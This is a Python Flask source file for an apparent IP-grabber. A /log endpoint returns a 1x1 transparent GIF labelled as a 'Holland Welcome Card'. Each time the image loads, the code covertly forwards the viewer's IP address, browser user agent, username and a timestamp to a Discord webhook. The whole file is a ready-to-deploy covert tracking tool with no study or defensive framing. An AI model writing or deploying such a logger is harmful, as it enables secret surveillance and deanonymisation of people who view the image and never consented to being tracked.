import os
from flask import Flask, request, send_file
import requests 
from datetime import datetime
import io

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')

PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

@app.route('/log')
def track():
    if not DISCORD_WEBHOOK_URL:
        return "Error: Discord Webhook URL is not configured on the server.", 500

    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    username = request.args.get('username', 'Guest')
    avatar_url = request.args.get('avatar', '')

    embed = {
        "title": "🔥 Holland Card Loaded!",
        "color": 16744448, 
        "fields": [
            {"name": "👤 Username", "value": f"```{username}```", "inline": True},
            {"name": "🌐 IP Address", "value": f"```{ip_address}```", "inline": True},
            {"name": "⏰ Timestamp (UTC)", "value": f"`{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}`"},
            {"name": "📱 Device/Browser Info", "value": f"```\n{user_agent}\n```"}
        ],
        "thumbnail": {"url": avatar_url} if avatar_url else None,
        "footer": {"text": "Logged via Holland Welcome Card"}
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Error sending to Discord: {e}")

    return send_file(io.BytesIO(PIXEL_BYTES), mimetype='image/gif')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
